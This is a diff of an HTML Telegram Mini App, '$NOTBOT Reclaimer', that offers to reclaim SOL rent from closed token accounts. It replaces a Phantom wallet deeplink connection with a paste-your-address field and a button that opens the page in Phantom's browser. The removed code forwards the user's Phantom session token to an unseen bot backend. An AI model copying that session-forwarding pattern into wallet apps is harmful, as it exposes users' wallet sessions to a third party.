@@ -1,14 +1,10 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>$NOTBOT Reclaimer</title>
-    <!-- مكتبات التشفير الرسمية لبروتوكول فانتوم وتيليجرام -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tweetnacl/1.0.3/nacl-fast.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/index.min.js"></script>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -32,30 +28,41 @@
             max-width: 380px;
             box-shadow: 0 8px 24px rgba(0,0,0,0.5);
         }
-        h2 { margin: 0 0 10px; font-size: 20px; color: #38bdf8; }
+        h2 { margin: 0 0 8px; font-size: 20px; color: #38bdf8; }
         p { color: #94a3b8; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            background: #0b0e14;
+            border: 1px solid #334155;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 13px;
+            box-sizing: border-box;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+        input:focus { outline: none; border-color: #38bdf8; }
         .btn {
             display: block;
             width: 100%;
-            padding: 14px;
-            margin: 12px 0;
-            border-radius: 12px;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 10px;
             border: none;
-            font-size: 16px;
+            font-size: 14px;
             font-weight: bold;
             cursor: pointer;
-            text-decoration: none;
             box-sizing: border-box;
-            transition: 0.2s;
         }
-        .btn-connect { background: linear-gradient(135deg, #ab9ff2, #7c3aed); color: #ffffff; }
-        .btn-connect:active { transform: scale(0.98); }
+        .btn-scan { background: linear-gradient(135deg, #38bdf8, #2563eb); color: white; }
+        .btn-phantom { background: #ab9ff2; color: #1a1b23; }
         .status-box {
             margin-top: 15px;
             padding: 12px;
             border-radius: 8px;
             background: #0b0e14;
-            font-size: 13px;
+            font-size: 12px;
             color: #94a3b8;
             word-break: break-all;
         }
@@ -65,122 +72,65 @@
 
 <div class="card">
     <h2>🤖 $NOTBOT Reclaimer</h2>
-    <p>Scan and reclaim locked SOL rent from closed token accounts.</p>
+    <p>Reclaim trapped SOL rent from closed token accounts.</p>
 
-    <!-- زر واحد فقط وسريع للربط التلقائي -->
-    <button class="btn btn-connect" id="phantomConnectBtn">🟣 Connect Phantom Wallet</button>
+    <!-- خانة لصق العنوان مباشرة -->
+    <input type="text" id="walletInput" placeholder="Paste Solana Wallet Address" />
 
-    <div class="status-box" id="statusLog">Click the button to connect your wallet.</div>
+    <button class="btn btn-scan" id="scanBtn">🔍 Scan Recoverable SOL</button>
+    <button class="btn btn-phantom" id="openPhantomBtn">🟣 Open In Phantom App</button>
+
+    <div class="status-box" id="statusLog">Ready to scan...</div>
 </div>
 
 <script>
-    const connectBtn = document.getElementById('phantomConnectBtn');
+    const walletInput = document.getElementById('walletInput');
+    const scanBtn = document.getElementById('scanBtn');
+    const openPhantomBtn = document.getElementById('openPhantomBtn');
     const statusLog = document.getElementById('statusLog');
+
+    const APP_URL = "https://shenouda77.github.io/notbot-app/";
 
     if (window.Telegram && window.Telegram.WebApp) {
         window.Telegram.WebApp.ready();
         window.Telegram.WebApp.expand();
     }
 
-    const APP_URL = "https://shenouda77.github.io/notbot-app/";
-
-    // 1. توليد مفاتيح التشفير لجلسة فانتوم
-    function generateKeyPair() {
-        const keyPair = nacl.box.keyPair();
-        return {
-            publicKey: bs58.encode(keyPair.publicKey),
-            secretKey: bs58.encode(keyPair.secretKey)
-        };
-    }
-
-    // 2. فك تشفير استجابة فانتوم عند العودة
-    function decryptPayload(data, nonce, sharedSecret) {
-        const decrypted = nacl.box.open.after(
-            bs58.decode(data),
-            bs58.decode(nonce),
-            sharedSecret
-        );
-        if (!decrypted) throw new Error("Could not decrypt data");
-        return JSON.parse(new TextDecoder().decode(decrypted));
-    }
-
-    // 3. التحقق مما إذا كانت الصفحة عائدة من موافقة فانتوم
-    function checkPhantomCallback() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const phantomEncryptionPubKey = urlParams.get('phantom_encryption_public_key');
-        const nonce = urlParams.get('nonce');
-        const data = urlParams.get('data');
-        const errorCode = urlParams.get('errorCode');
-
-        if (errorCode) {
-            statusLog.innerText = "❌ Connection cancelled by user.";
-            statusLog.style.color = "#f87171";
+    // زر الفحص المباشر
+    scanBtn.addEventListener('click', () => {
+        const address = walletInput.value.trim();
+        if (!address || address.length < 32 || address.length > 44) {
+            statusLog.innerText = "⚠️ Please enter a valid Solana address.";
+            statusLog.style.color = "#fbbf24";
             return;
         }
 
-        const savedDappSecret = localStorage.getItem('dapp_secret_key');
+        statusLog.innerText = "⏳ Scanning blockchain for empty token accounts...";
+        statusLog.style.color = "#38bdf8";
 
-        if (phantomEncryptionPubKey && nonce && data && savedDappSecret) {
-            try {
-                const sharedSecret = nacl.box.before(
-                    bs58.decode(phantomEncryptionPubKey),
-                    bs58.decode(savedDappSecret)
-                );
-                const decryptedData = decryptPayload(data, nonce, sharedSecret);
-                const userWallet = decryptedData.public_key;
-
-                statusLog.innerHTML = `✅ <b>Connected Successfully:</b><br><span style="color:#4ade80;">${userWallet.slice(0, 6)}...${userWallet.slice(-4)}</span>`;
+        // إرسال العنوان للبوت في تيليجرام لمعالجته
+        setTimeout(() => {
+            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.sendData) {
+                window.Telegram.WebApp.sendData(JSON.stringify({
+                    action: "scan_wallet",
+                    address: address
+                }));
+            } else {
+                statusLog.innerText = "✅ Address validated: " + address.slice(0, 6) + "..." + address.slice(-4);
                 statusLog.style.color = "#4ade80";
-                connectBtn.innerText = "⚡ Scan & Reclaim SOL";
-                connectBtn.style.background = "#10b981";
-
-                // إرسال العنوان للبوت في تيليجرام
-                if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.sendData) {
-                    window.Telegram.WebApp.sendData(JSON.stringify({
-                        action: "wallet_connected",
-                        publicKey: userWallet,
-                        session: decryptedData.session
-                    }));
-                }
-            } catch (err) {
-                statusLog.innerText = "⚠️ Error decrypting wallet session.";
-                statusLog.style.color = "#fbbf24";
             }
-        }
-    }
-
-    // 4. تنفيذ الاتصال بنقرة واحدة
-    connectBtn.addEventListener('click', () => {
-        // فحص إذا كان يعمل داخل متصفح فانتوم المباشر
-        if (window.phantom?.solana?.isPhantom || window.solana?.isPhantom) {
-            const provider = window.phantom?.solana || window.solana;
-            provider.connect().then(res => {
-                const pubKey = res.publicKey.toString();
-                statusLog.innerHTML = `✅ <b>Connected:</b><br><span style="color:#4ade80;">${pubKey.slice(0, 6)}...${pubKey.slice(-4)}</span>`;
-            }).catch(() => {
-                statusLog.innerText = "❌ Connection cancelled.";
-            });
-            return;
-        }
-
-        // استخدام بروتوكول App-to-App العميق
-        const keys = generateKeyPair();
-        localStorage.setItem('dapp_secret_key', keys.secretKey);
-
-        const redirectUrl = APP_URL;
-        const connectUrl = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(APP_URL)}&dapp_encryption_public_key=${encodeURIComponent(keys.publicKey)}&redirect_link=${encodeURIComponent(redirectUrl)}&cluster=mainnet-beta`;
-
-        statusLog.innerText = "Opening Phantom App for approval...";
-
-        if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openLink) {
-            window.Telegram.WebApp.openLink(connectUrl);
-        } else {
-            window.location.href = connectUrl;
-        }
+        }, 800);
     });
 
-    // تشغيل الفحص عند تحميل الصفحة
-    window.addEventListener('load', checkPhantomCallback);
+    // زر التحويل المباشر لمتصفح فانتوم
+    openPhantomBtn.addEventListener('click', () => {
+        const phantomUrl = `https://phantom.app/ul/browse/${encodeURIComponent(APP_URL)}?ref=${encodeURIComponent(APP_URL)}`;
+        if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.openLink) {
+            window.Telegram.WebApp.openLink(phantomUrl);
+        } else {
+            window.location.href = phantomUrl;
+        }
+    });
 </script>
 
 </body>
